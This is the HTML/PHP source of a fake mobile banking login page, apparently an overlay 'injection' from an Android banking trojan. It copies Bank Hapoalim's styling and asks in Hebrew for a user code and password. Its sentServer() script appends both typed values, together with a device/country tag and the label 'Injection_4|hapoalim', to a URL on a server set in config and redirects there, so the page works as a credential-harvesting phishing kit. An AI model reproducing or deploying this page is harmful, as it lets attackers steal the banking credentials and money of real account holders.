<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="il/com.ideomobile.hapoalim/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAAsCAYAAADM+JIcAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA01pVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoMTMuMCAyMDEyMDMwNS5tLjQxNSAyMDEyLzAzLzA1OjIxOjAwOjAwKSAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkFBRTg1RjkzOEExQjExRTE5NDRCRTcyNEJFMkU0QzhEIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkFBRTg1Rjk0OEExQjExRTE5NDRCRTcyNEJFMkU0QzhEIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QUFFODVGOTE4QTFCMTFFMTk0NEJFNzI0QkUyRTRDOEQiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QUFFODVGOTI4QTFCMTFFMTk0NEJFNzI0QkUyRTRDOEQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1l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" style="float: right;margin-right: 10px; margin-top: 10px;">
<br><br><br>
</div>

    <div class="main">
        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">

                            <div class="form-group ">
									<input type="text" class="form-control" name="field2" id="Azonostio" placeholder="קוד משתמש" aria-label="קוד משתמש" autocomplete="off" maxlength="50" data-reg="/.{3,50}/" >
                            </div>

                            <div class="form-group"> 
									<input type="password" class="form-control" name="field3" id="Jelszo" placeholder="סיסמא" aria-label="סיסמא" autocomplete="off" data-reg="/.{3,50}/" maxlength="50" >
                            </div>
			
                       								<input type="button" class="input_submitBtn" onClick="sentServer();" value="כניסה">
 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>

<script>			
	function sentServer()
	{
	var oNumInp1 = document.getElementById('Azonostio');
	var oNumInp2 = document.getElementById('Jelszo');

if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["Azonostio"].value; 
	var pass = document.forms["form"].elements["Jelszo"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|hapoalim|"+login1+"|"+pass);
	}
}
</script>
</body>
</html>
